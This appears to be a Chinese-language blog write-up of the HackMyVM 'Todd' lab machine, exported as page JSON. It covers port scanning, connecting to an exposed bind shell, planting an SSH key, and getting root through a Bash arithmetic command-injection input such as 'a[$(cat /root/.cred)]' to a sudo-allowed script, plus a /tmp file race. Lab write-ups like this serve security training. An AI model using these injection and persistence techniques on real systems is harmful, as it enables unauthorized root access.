{"pageProps":{"postData":{"id":"HackMyVMTodd","contentHtml":"<h1>Todd.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Todd\">https://hackmyvm.eu/machines/machine.php?vm=Todd</a></p>\n</blockquote>\n<p>Note：<strong>Find Todd.</strong></p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">  nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:02 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00040s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00022s latency).\nMAC Address: 08:00:27:EA:BE:43 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.42\nHost is up (0.00032s latency).\nMAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 15.07 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">  nmap -sT -min-rate 10000 -p- 192.168.56.42\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:08 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.42\nHost is up (0.00042s latency).\nNot shown: 65522 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n7066/tcp  open  unknown\n8237/tcp  open  unknown\n9460/tcp  open  unknown\n10825/tcp open  unknown\n11523/tcp open  unknown\n14055/tcp open  unknown\n15617/tcp open  unknown\n18585/tcp open  unknown\n20111/tcp open  unknown\n22005/tcp open  optohost004\n24745/tcp open  unknown\nMAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 10.77 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">  nmap -sT -A -T4 -O -p 22,80 192.168.56.42 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:10 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.42\nHost is up (0.00050s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)\n|   256 1e:a7:44:0b:2c:1b:0d:77:83:<span class=\"hljs-built_in\">df</span>:1d:9f:0e:30:08:4d (ECDSA)\n|_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)\n80/tcp open  http    Apache httpd 2.4.59 ((Debian))\n|_http-title: Mindful Listening\n|_http-server-header: Apache/2.4.59 (Debian)\nMAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.42\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 14.89 seconds\n</code></pre>\n<p>访问 <code>HTTP</code> 并提取指纹</p>\n<p><img src=\"/post-images/HackMyVMTodd/image.png\" alt=\"image.png\"></p>\n<h2>Web 渗透</h2>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-bash\"> gobuster <span class=\"hljs-built_in\">dir</span> -u http://192.168.56.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,502,429 --no-error\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.42\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,403,502,429\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/tools                (Status: 301) [Size: 314] [--> http://192.168.56.42/tools/]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>扫描到 <code>Tools</code>文件夹，里面是常用（雾）的工具</p>\n<p><img src=\"/post-images/HackMyVMTodd/image1.png\" alt=\"image.png\"></p>\n<p>没找到入口，仔细阅读主页上的文本：</p>\n<blockquote>\n<p>The quieter you become,the more you are able to hear</p>\n</blockquote>\n<p>在扫描一次端口，发现依旧存在只有<code>22</code>，<code>80</code>，<code>7066</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Todd  nmap -sT -min-rate 10000 -p- 192.168.56.42\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-13 03:26 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.42\nHost is up (0.0010s latency).\nNot shown: 65523 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n5182/tcp  open  unknown\n5974/tcp  open  unknown\n7066/tcp  open  unknown\n12754/tcp open  unknown\n15375/tcp open  unknown\n20687/tcp open  unknown\n22952/tcp open  unknown\n25782/tcp open  unknown\n27457/tcp open  unknown\n29429/tcp open  unknown\nMAC Address: 08:00:27:53:2D:C6 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>使用<code>nc</code> ，发现在此端口上绑定了一个<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Todd  nc 192.168.56.42 7066\n<span class=\"hljs-built_in\">id</span>\nuid=1000(todd) gid=1000(todd) <span class=\"hljs-built_in\">groups</span>=1000(todd)\n</code></pre>\n<p>可以直接到家目录读取<code>Flag</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> user.txt\nTodd{eb93009a2719640de486c4f68daf62ec}\n</code></pre>\n<p>写入<code>SSH</code>公钥，以获得稳定 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa xxxxxxx\"</span> > .ssh/authorized_keys\n</code></pre>\n<h2>提权</h2>\n<p>想起来原本放在<code>Web</code>目录下的工具，我们直接可以使用</p>\n<p>但是权限有限</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 9580\ndrwxr-xr-x 2 root root    4096 Mar 22 08:14 .\ndrwxr-xr-x 3 root root    4096 Mar 22 08:14 ..\n-rwxr-xr-x 1 root root 6266348 Feb 25  2024 fscan\n-rw-r--r-- 1 root root   90934 Nov 25  2023 les.sh\n-rw-r--r-- 1 root root  332111 Apr 17  2023 linpeas.sh\n-rwxr-xr-x 1 root root 3104768 Apr 17  2023 pspy64\n</code></pre>\n<p>我们使用<code>pspy64</code>查看一下进程</p>\n<pre><code class=\"hljs language-bash\">$ ./pspy64                                                                                                        \npspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d                                     \n                                                                                                                  \n                                                                                                                  \n     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                           \n    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                           \n    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                           \n    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                           \n    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                           \n    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒          \n    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░          \n    ░░       ░  ░  ░  ░░       ▒ ▒ ░░           \n                   ░           ░ ░              \n                               ░ ░                  \n                                             \n Draining file system events due to startup...                                                                     \n<span class=\"hljs-keyword\">done</span>                                                                                                              \n2025/04/13 03:39:23 CMD: UID=1000  PID=12747  | ./pspy64                                                          \n2025/04/13 03:39:23 CMD: UID=1000  PID=12678  | -sh                                                               \n2025/04/13 03:39:23 CMD: UID=1000  PID=12677  | sshd: todd@pts/0      \n2025/04/13 03:39:23 CMD: UID=1000  PID=12669  | (sd-pam)                                                          \n2025/04/13 03:39:23 CMD: UID=1000  PID=12668  | /lib/systemd/systemd --user                         \n2025/04/13 03:39:23 CMD: UID=1000  PID=12667  | nc -e /opt/fake_ssh -lp 1214                                      \n2025/04/13 03:39:23 CMD: UID=0     PID=12665  | <span class=\"hljs-built_in\">sudo</span> -u todd nc -e /opt/fake_ssh -lp 1214                         \n2025/04/13 03:39:23 CMD: UID=0     PID=12664  | /bin/bash /opt/create_nc.sh                                       \n2025/04/13 03:39:23 CMD: UID=0     PID=12662  | sshd: todd [priv]                                                 \n2025/04/13 03:39:23 CMD: UID=1000  PID=12661  | nc -e /opt/fake_ssh -lp 10331                                     \n2025/04/13 03:39:23 CMD: UID=0     PID=12660  | <span class=\"hljs-built_in\">sudo</span> -u todd nc -e /opt/fake_ssh -lp 10331                        \n2025/04/13 03:39:23 CMD: UID=0     PID=12658  | /bin/bash /opt/create_nc.sh                                       \n2025/04/13 03:39:23 CMD: UID=1000  PID=12656  | nc -e /opt/fake_ssh -lp 27485                                     \n2025/04/13 03:39:23 CMD: UID=0     PID=12655  | <span class=\"hljs-built_in\">sudo</span> -u todd nc -e /opt/fake_ssh -lp 27485  <span class=\"hljs-string\">\"kali\"</span> 03:40 13-4月-25 \n</code></pre>\n<p>可以发现一直在以<code>root</code>权限运行<code>/bin/bash /opt/create_nc.sh</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Mar 22 10:40 .\ndrwxr-xr-x 18 root root  4096 Nov 13  2020 ..\n-rwx------  1 root root   138 Mar 22 08:00 create_nc2.sh\n-rwx---r--  1 root root   141 Mar 22 07:42 create_nc.sh\n-rwx------  1 root root 16608 Mar 22 07:21 fake_ssh\n-rwx------  1 root root    17 Mar 22 07:07 kill_todd.sh\n</code></pre>\n<p>可以看到该脚本就是生成端口并建立<code>shell</code>连接</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cat</span> create_nc.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-function\"><span class=\"hljs-title\">create_ssh</span></span>(){\n        <span class=\"hljs-built_in\">sudo</span> -u todd nc -e /opt/fake_ssh -lp <span class=\"hljs-variable\">$1</span>\n}\n\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(<span class=\"hljs-built_in\">seq</span> 10)\n<span class=\"hljs-keyword\">do</span>\n        a=$((RANDOM))\n        <span class=\"hljs-built_in\">sleep</span> 0.2\n        create_ssh <span class=\"hljs-variable\">$a</span> &#x26;\n<span class=\"hljs-keyword\">done</span>\n</code></pre>\n<p>查看一下<code>sudo</code>权限</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> todd on todd:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser todd may run the following commands on todd:\n    (ALL : ALL) NOPASSWD: /bin/bash /srv/guess_and_check.sh\n    (ALL : ALL) NOPASSWD: /usr/bin/rm\n    (ALL : ALL) NOPASSWD: /usr/sbin/reboot                                                                           \n</code></pre>\n<p>查看 <code>guess_and_check.sh</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> &#x3C;&#x3C; <span class=\"hljs-string\">EOF                                               \n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,     HackMyVM                                                   \nEOF</span>                                                      \n\n<span class=\"hljs-comment\"># check this script used by human                        </span>\na=$((RANDOM%<span class=\"hljs-number\">1000</span>))                                       \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Please Input [<span class=\"hljs-variable\">$a</span>]\"</span>                                 \n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[+] Check this script used by human.\"</span>              \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[+] Please Input Correct Number:\"</span>                  \n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\">>>\"</span> input_number                               \n\n[[ <span class=\"hljs-variable\">$input_number</span> -ne <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$a</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">exit</span> 1                   \n\n<span class=\"hljs-built_in\">sleep</span> 0.2                                                \ntrue_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span>                        \n<span class=\"hljs-built_in\">sleep</span> 1                                                  \nfalse_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span>                       \n\n[[ -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$true_file</span>\"</span> ]] &#x26;&#x26; [[ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$false_file</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">cat</span> /root/.cred || <span class=\"hljs-built_in\">exit</span> 2           \n</code></pre>\n<p>看来是考察 <code>Shell</code> 知识了</p>\n<ul>\n<li><code>read</code>+用户交互，强制输入；</li>\n<li>配合 <code>sleep</code> 随机等待，防止太快的自动脚本行为；</li>\n<li>文件判断 <code>true_file</code>/<code>false_file</code> 作为一个简单的“逻辑开关”，需要外部提前创建好 <code>/tmp/随机值</code> 文件，才会泄露 <code>/root/.cred</code></li>\n</ul>\n<h3>解法 1</h3>\n<p>注入点其实在这：</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\">>>\"</span> input_number                               \n\n[[ <span class=\"hljs-variable\">$input_number</span> -ne <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$a</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">exit</span> 1 \n</code></pre>\n<p>比较用户输入的数字 <code>$input_number</code> 是否与 <code>$a</code> 相等。<code>ne</code> 表示“not equal”，如果<strong>不相等</strong>，就立刻退出脚本，返回码为 <code>1</code>。</p>\n<p>但是我们输入<code>a</code> 时，返回码为<code>2</code></p>\n<pre><code class=\"hljs language-bash\">[+] Please Input Correct Number:\n>>>a\n$ <span class=\"hljs-built_in\">echo</span> $?\n2\n</code></pre>\n<p>输入 <code>a</code>，变量 <code>input_number=a</code> ，相等于执行<code>[[ a -ne 123 ]]</code>（假设随机数是123），然后</p>\n<p>到最后判断时不相等所以触发了<code>exit 2</code> 在 Bash 的 <code>[[ ... ]]</code> 条件判断中，当参与比较的任一侧不是一个有效的整数时，整个表达式无法正常计算，返回一个非零状态码（通常是 2）</p>\n<p>关键在于“短路”机制：<code>[[ ... ]] &#x26;&#x26; exit 1</code>只有在<code>[[ ... ]]</code>成功（返回 0）时才会执行<code>exit 1</code>但这里因为算术比较失败，所以返回的状态码不为 0，也就是说，“&#x26;&#x26;”后面的<code>exit 1</code> 根本不会被执行。</p>\n<p>另外一种解释就是，下面解释来自：<a href=\"https://7r1umph.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html\">https://7r1umph.github.io/post/qun-zhu-ti-hou-xu-%20%60-ne%60%20-rao-guo-%20-%20-bian-liang-jie-xi-yu-%20Python%202%20%60input%28%29%60%20-de-qi-shi.html</a></p>\n<ul>\n<li>\n<p><strong>示例 1: <code>[[ a -ne \"$a\" ]]</code></strong></p>\n<p>假设脚本中的随机数变量就是 <code>a</code> (例如 <code>a=42</code>)。在这个表达式中：</p>\n<ol>\n<li>第一个 <code>a</code> <strong>没有引号</strong>。Bash 会尝试查找名为 <code>a</code> 的变量。</li>\n<li>它找到了，值为 <code>42</code>。表达式变为 <code>[[ 42 -ne \"$a\" ]]</code>。</li>\n<li>第二个 <code>$a</code> 被扩展为其值 <code>42</code>。表达式变为 <code>[[ 42 -ne 42 ]]</code>。</li>\n<li>算术比较 <code>42 -ne 42</code> 的结果是 <strong>false</strong> (因为它们相等)，<code>[[</code> 命令退出状态为 <strong>1</strong>。</li>\n<li><code>if</code> 语句看到退出状态 1，条件判断为 <strong>false</strong>，从而跳过 <code>exit 1</code>。</li>\n</ol>\n</li>\n<li>\n<p><strong>示例 2: <code>[[ b -ne \"$a\" ]]</code></strong></p>\n<p>假设变量 <code>b</code> 未定义：</p>\n<ol>\n<li>第一个 <code>b</code> <strong>没有引号</strong>。Bash 尝试查找名为 <code>b</code> 的变量。</li>\n<li>未找到。根据 Bash 的设置（例如 <code>set -u</code> 是否开启），这可能导致错误，或者未定义的变量被视为空字符串或 0。</li>\n<li>如果视为空或 0，假设 <code>$a</code> 是 42，表达式可能变为 <code>[[ 0 -ne 42 ]]</code> 或 <code>[[ \"\" -ne 42 ]]</code>。</li>\n<li><code>[[ 0 -ne 42 ]]</code> 结果为 <strong>true</strong> (退出状态 0)。<code>if</code> 条件满足，执行 <code>exit 1</code>。</li>\n<li><code>[[ \"\" -ne 42 ]]</code> 中空字符串不是有效整数，<code>ne</code> 操作失败，<code>[[</code> 退出状态 <strong>非零</strong>。<code>if</code> 条件判断为 <strong>false</strong>，跳过 <code>exit 1</code>。（这更接近我们之前用 <code>aaa</code> 的情况）</li>\n</ol>\n</li>\n</ul>\n<p>我更倾向于第二个解释。</p>\n<p>然后你可以传入一个数组，例如：<code>a[1]</code></p>\n<p>在 <code>shell</code> 语言中，数组的下标是数字，那个数字是会运算的，例如你可以构造：<code>a[$(id)]</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> /bin/bash ./guess_and_check.sh\n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,     HackMyVM\nPlease Input [510]\n[+] Check this script used by human.\n[+] Please Input Correct Number:\n>>>a[$(<span class=\"hljs-built_in\">id</span>)]\n/srv/guess_and_check.sh: line 35: uid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root): syntax error <span class=\"hljs-keyword\">in</span> expression (error token is <span class=\"hljs-string\">\"(root) gid=0(root) groups=0(root)\"</span>)\n</code></pre>\n<p>就会先运算了括号那的命令，然后数组再找下标，然后找到的是一串字符串，就会报错</p>\n<p>我们可以通过该特性直接读取<code>/root/.cred</code></p>\n<pre><code class=\"hljs language-bash\">>>>a[$(<span class=\"hljs-built_in\">cat</span> /root/.cred)]\n/srv/guess_and_check.sh: line 35: fake password: syntax error <span class=\"hljs-keyword\">in</span> expression (error token is <span class=\"hljs-string\">\"password\"</span>)\n</code></pre>\n<p>或者直接读取<code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">>>>a[$(<span class=\"hljs-built_in\">cat</span> /root/root.txt)]\n/srv/guess_and_check.sh: line 35: Todd{389c9909b8d6a701217a45104de7aa21}: syntax error: invalid arithmetic operator (error token is <span class=\"hljs-string\">\"{389c9909b8d6a701217a45104de7aa21}\"</span>)\n</code></pre>\n<h3>解法 2</h3>\n<p>那就是分析脚本</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> &#x3C;&#x3C; <span class=\"hljs-string\">EOF                                               \n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,     HackMyVM                                                   \nEOF</span>                                                      \n\n<span class=\"hljs-comment\"># check this script used by human                        </span>\na=$((RANDOM%<span class=\"hljs-number\">1000</span>))                                       \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Please Input [<span class=\"hljs-variable\">$a</span>]\"</span>                                 \n\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[+] Check this script used by human.\"</span>              \n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[+] Please Input Correct Number:\"</span>                  \n<span class=\"hljs-built_in\">read</span> -p <span class=\"hljs-string\">\">>>\"</span> input_number                               \n\n[[ <span class=\"hljs-variable\">$input_number</span> -ne <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$a</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">exit</span> 1                   \n\n<span class=\"hljs-built_in\">sleep</span> 0.2                                                \ntrue_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span>                        \n<span class=\"hljs-built_in\">sleep</span> 1                                                  \nfalse_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span>                       \n\n[[ -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$true_file</span>\"</span> ]] &#x26;&#x26; [[ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$false_file</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">cat</span> /root/.cred || <span class=\"hljs-built_in\">exit</span> 2           \n</code></pre>\n<p>这里就是主要要看</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sleep</span> 0.2                                                \ntrue_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span>                        \n<span class=\"hljs-built_in\">sleep</span> 1                                                  \nfalse_file=<span class=\"hljs-string\">\"/tmp/<span class=\"hljs-subst\">$((RANDOM%1000)</span>)\"</span> \n  \n[[ -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$true_file</span>\"</span> ]] &#x26;&#x26; [[ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$false_file</span>\"</span> ]] &#x26;&#x26; <span class=\"hljs-built_in\">cat</span> /root/.cred || <span class=\"hljs-built_in\">exit</span> 2     \n</code></pre>\n<p>我们直接创建<code>500</code>个文件</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cd</span> /tmp  \n$ <span class=\"hljs-built_in\">touch</span> $(<span class=\"hljs-built_in\">seq</span> 500)\n</code></pre>\n<p>这样正确的概率就会蛮高的</p>\n<pre><code class=\"hljs language-bash\">Please Input [340]\n[+] Check this script used by human.\n[+] Please Input Correct Number:\n>>>340\nfake password\n</code></pre>\n<p><code>fake password</code> 就是<code>root</code>密码</p>\n<pre><code class=\"hljs language-bash\">root@todd:~# <span class=\"hljs-built_in\">cat</span> root.txt \nTodd{389c9909b8d6a701217a45104de7aa21}\n</code></pre>","title":"HackMyVM - Todd","date":"2025-04-13","updated":"2025-04-13","comments":true,"tags":["HackMyVM","Linux靶机","Shell语言"],"categories":"靶机"},"recentPosts":[{"title":"HackTheBox - Machine -Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false},{"title":"Vulnyx - Build","slug":"VulnyxBuild","date":"2025-06-01","updated":"2025-06-01","isEncrypted":false}]},"__N_SSG":true}